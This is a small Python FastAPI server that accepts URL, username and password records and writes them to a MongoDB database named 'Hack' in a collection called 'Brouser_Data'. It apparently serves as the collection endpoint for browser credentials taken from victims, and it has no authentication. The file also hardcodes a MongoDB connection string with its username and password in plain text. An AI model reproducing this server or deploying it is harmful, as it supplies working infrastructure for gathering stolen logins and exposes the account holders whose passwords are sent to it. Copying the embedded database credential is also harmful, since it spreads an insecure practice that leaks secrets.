from fastapi import FastAPI, HTTPException
from motor.motor_asyncio import AsyncIOMotorClient
from pydantic import BaseModel
import asyncio

# Define the data model
class Item(BaseModel):
    URL: str
    Username: str
    Pass: str

app = FastAPI()

# Replace the following with your MongoDB connection string
uri = 'mongodb+srv://sanjay:sanjay@cluster0.84kv7m8.mongodb.net/Hack?appName=Cluster0'

# Create MongoDB client
client = AsyncIOMotorClient(uri)
db = client['Hack']
collection = db['Brouser_Data']

@app.post("/items/")
async def create_item(item: Item):
    data = item.dict()
    result = await collection.insert_one(data)
    if result.inserted_id:
        return {"id": str(result.inserted_id)}
    else:
        raise HTTPException(status_code=500, detail="Failed to insert item")

@app.get("/")
async def read_root():
    return {"message": "Welcome to the FastAPI MongoDB API"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
